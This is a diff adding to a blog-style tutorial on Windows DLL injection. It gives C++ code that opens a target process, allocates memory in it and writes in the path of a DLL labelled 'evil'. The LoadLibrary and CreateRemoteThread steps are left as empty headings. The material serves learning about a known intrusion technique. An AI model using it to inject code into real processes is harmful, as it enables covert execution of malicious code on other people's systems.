@@ -112,3 +112,88 @@ By doing this, we successfully inject the DLL into the running process.
 
 
 <img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/proc-injection-dll-inject.png">
+
+### Headers and Arguments
+Let's first defined the needed headers and the argument that we need to pass it on. Here we will pass the process Id as an argument and DLL file will be defined within code itself.
+```c++
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <windows.h>
+#include <tlhelp32.h>
+
+char injectDLL[] = "C:\\Users\\theni\\source\\repos\\DLLInjection\\ARM64\\Debug\\DLLInjection.dll";
+unsigned int dllLength = sizeof(injectDLL) + 1;
+
+int main(int argc, char* argv[]) {
+
+
+    // parse process ID
+    if (atoi(argv[1]) == 0) {
+        printf("PID not found :( exiting...\n");
+        return -1;
+    }
+    printf("PID: %i", atoi(argv[1]));
+```
+
+### OpenProcess
+After identifying the process ID we want to inject into, the next step is to open a handle to the process using the OpenProcess function. I have detailed this function in a [blog post](https://nirajkharel.com.np/posts/process-module-enumeration/#openprocess). It is crucial to provide the necessary permissions: PROCESS_VM_WRITE, PROCESS_VM_OPERATION, and PROCESS_CREATE_THREAD, as we need to access the address, write into the memory, and execute a remote thread.
+
+
+```c++
+ HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, DWORD(atoi(argv[1])));
+ if (hProcess == NULL) {
+     printf("Error opening handle to the process, %u\n", GetLastError());
+     return 1;
+ }
+
+ printf("Successfully Opened Handle to the Process\n");
+```
+
+### VirtualAllocEx
+We need to allocate our buffer in the virtual address space of the running process. Before doing that, we must allocate or reserve a region of memory within the virtual address space. This can be done using the **VirtualAllocEx** function of the Windows API. I have already described this [in detail here](https://nirajkharel.com.np/posts/process-injection-shellcode/#buffer-allocation---virtualallocex).
+
+
+```c++
+
+    // allocate memory buffer for remote process
+    LPVOID lpAlloc = VirtualAllocEx(hProcess, NULL, dllLength, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+    if (lpAlloc == NULL) {
+        printf("Error Allocating memory to the process, %u\n", GetLastError());
+        return 1;
+    }
+    printf("Successfully Allocated memory to the Process\n");
+```
+
+### WriteProcessMemory
+Once we have allocated memory in the virtual address space, the next task is to write the DLL path into that memory. This was also explained in detail in [a previous blog post](https://nirajkharel.com.np/posts/process-injection-shellcode/#write-buffer-into-the-allocated-memory---writeprocessmemory).
+```c++
+ // "copy" evil DLL between processes
+ BOOL bWrite = WriteProcessMemory(hProcess, lpAlloc, injectDLL, dllLength, NULL);
+ if (bWrite == NULL) {
+     printf("Error writing DLL to the process, %u\n", GetLastError());
+     return 1;
+ }
+ printf("Successfully copied DLL into the Process\n");
+```
+
+### LoadLibrary
+
+### CreateRemoteThread
+
+### WaitForSingleObject and CloseHandle
+
+
+<br>
+<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/proc-injection-dll-injection.gif">
+<br>
+
+### References
+- [https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
+- [https://medium.com/@0xey/t1055-001-process-injection-dll-injection-64dc14719faa](https://medium.com/@0xey/t1055-001-process-injection-dll-injection-64dc14719faa)
+- [https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection](https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection)
+- [https://pentestlab.blog/2017/04/04/dll-injection/](https://pentestlab.blog/2017/04/04/dll-injection/)
+- [https://www.youtube.com/watch?v=JPQWQfDhICA&t=1749s](https://www.youtube.com/watch?v=JPQWQfDhICA&t=1749s)
+- [https://www.youtube.com/watch?v=ilRJRkMyzlA](https://www.youtube.com/watch?v=ilRJRkMyzlA)
+- [https://www.youtube.com/watch?v=QWufdv3Y8Gw](https://www.youtube.com/watch?v=QWufdv3Y8Gw)
+- [https://www.youtube.com/watch?v=0jX9UoXYLa4](https://www.youtube.com/watch?v=0jX9UoXYLa4)
